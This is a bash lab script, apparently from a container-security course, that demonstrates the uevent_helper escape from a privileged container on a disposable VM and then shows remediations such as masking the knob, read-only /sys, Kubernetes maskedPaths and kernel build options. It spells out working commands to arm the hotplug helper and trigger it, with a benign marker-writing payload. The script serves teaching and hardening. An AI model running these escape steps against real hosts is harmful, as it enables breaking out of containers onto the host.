#!/usr/bin/env bash
# act3/02-uevent_helper.sh — escape 2 of 4: uevent_helper.
# Terminal: lab (B) + host (A). Uses sudo. DISPOSABLE LAB VM ONLY.
#
# NOTE BEFORE RUNNING: this escape depends on CONFIG_UEVENT_HELPER=y in the
# kernel build. The script DETECTS this in beat 1 and adapts: if the knob is
# absent or inert, the beat becomes 'kernel-config as remediation' — which is
# a legitimate outcome, not a failure. Check: grep UEVENT_HELPER /boot/config-$(uname -r)
#
# Beats: PREREQ → ESCAPE → REMEDIATE (same rhythm as 01).

set -euo pipefail

hr()   { printf '\n\033[1m%s\033[0m\n' "----------------------------------------------------------------"; }
hdr()  { printf '\n\033[1m== %s ==\033[0m\n' "$*"; }
say()  { printf '  %s\n' "$*"; }
pause(){ printf '\n  \033[2m[press Enter for the next beat]\033[0m'; read -r; }
JAIL_PROMPT='\[\033[35m\][PRIVILEGED-JAIL]\[\033[0m\] \$ '

PAYLOAD_DIR=/tmp/lab-escape
MARKER=$PAYLOAD_DIR/marker
KNOB=/sys/kernel/uevent_helper
KCONF=/boot/config-$(uname -r)

[[ $EUID -eq 0 ]] || exec sudo "$0" "$@"

ORIG=$(cat "$KNOB" 2>/dev/null || echo "")
cleanup() {
    [[ -e "$KNOB" ]] && echo "$ORIG" > "$KNOB" 2>/dev/null && say "cleanup: uevent_helper restored to '${ORIG:-<empty>}'"
    rm -rf "$PAYLOAD_DIR"
    return 0
}
trap cleanup EXIT INT TERM

# --------------------------------------------------------------------------
hdr "BEAT 1 — PREREQ: does this knob exist and live on this kernel?"
hr
say "uevent_helper: the kernel runs a program on every device uevent."
say "On this machine:"
if [[ -f "$KCONF" ]]; then
    grep -E 'CONFIG_UEVENT_HELPER' "$KCONF" | sed 's/^/    /' || say "    (no CONFIG_UEVENT_HELPER line — knob may not exist)"
fi
if [[ -e "$KNOB" ]]; then
    say "    knob exists: $KNOB (current: '$(cat "$KNOB")')"
    say "    → the escape is LIVE on this build. Beats 2-3 as normal."
else
    say "    knob MISSING on this kernel — remediation at the kernel-config"
    say "    layer already applied. Read beats 2-3 as the counterfactual,"
    say "    then jump to the check questions."
fi
pause

# --------------------------------------------------------------------------
hdr "BEAT 2 — ESCAPE: arm the hotplug helper, then cause a uevent"
hr
if [[ ! -e "$KNOB" ]]; then
    say "SKIPPED on this build (knob absent) — the counterfactual, for understanding:"
fi
mkdir -p "$PAYLOAD_DIR"
cat > "$PAYLOAD_DIR/payload.sh" <<'EOF'
#!/bin/sh
echo "uevent_helper ESCAPE: ran as $(id -un) pid $$ at $(date) args: $@" >> /tmp/lab-escape/marker
EOF
chmod +x "$PAYLOAD_DIR/payload.sh"
say "Into the jail. Run inside:"
say "    echo '/tmp/lab-escape/payload.sh' > $KNOB"
say "    cat $KNOB                (armed)"
say "    echo add > /sys/class/mem/null/uevent      (trigger: synthetic uevent)"
say "    sleep 1; cat /tmp/lab-escape/marker        (fired — check Terminal A too)"
say ""
say "Note: the trigger is 'echo add > uevent' — a WRITE to a sysfs file."
say "In production this fires on real hardware events: device plug, module"
say "load, suspend/resume. The attacker does not even need the trigger —"
say "the machine's own hardware events arm and fire it for them."
hr
env PS1="$JAIL_PROMPT" unshare -m bash
pause

# --------------------------------------------------------------------------
hdr "BEAT 3 — REMEDIATE: /sys is not yours to write"
hr
say "Run inside a fresh jail:"
say "    mount --bind /dev/null $KNOB"
say "    echo '/tmp/lab-escape/payload.sh' > $KNOB    (into the void — knob unchanged)"
say "    echo add > /sys/class/mem/null/uevent        (no marker: defense held)"
say "Flavor 2:"
say "    mount -o remount,ro /sys 2>/dev/null || echo '(sysfs remount blocked — good: that is hardening too)'"
say ""
say "Kubernetes mapping:"
say "  maskedPaths: [/sys/kernel/uevent_helper]  — runc does the bind for you"
say "  readOnlyRootFilesystem + no host /sys mount  — pod never sees /sys at all"
say "  Kernel build (the beat 1 check) — CONFIG_UEVENT_HELPER absent = dead knob"
hr
env PS1="$JAIL_PROMPT" unshare -m bash

# --------------------------------------------------------------------------
hdr "RESIDUE CHECK (automatic)"
[[ -f "$MARKER" ]] && say "marker: $(wc -l < "$MARKER") escape line(s) recorded (yours to read)" || say "marker: none"
say "uevent_helper now: '$(cat "$KNOB" 2>/dev/null || echo <gone>)' (trap restores after this line)"

hdr "CHECK QUESTIONS (act3/02)"
cat <<'EOF'
  1. Same recipe as core_pattern — name the ONE thing that differed.
     (Hint: the trigger event, and who can cause it in production.)
  2. Why does the production version of this escape not even need the
     attacker to fire the trigger?
  3. This escape can be dead at kernel BUILD time. What does that teach
     about the layers of container defense? (config → mount → caps → ...)

  Next: act3-escapes/03-binfmt_misc.sh — this time the kernel runs the
  interpreter FOR you.
EOF
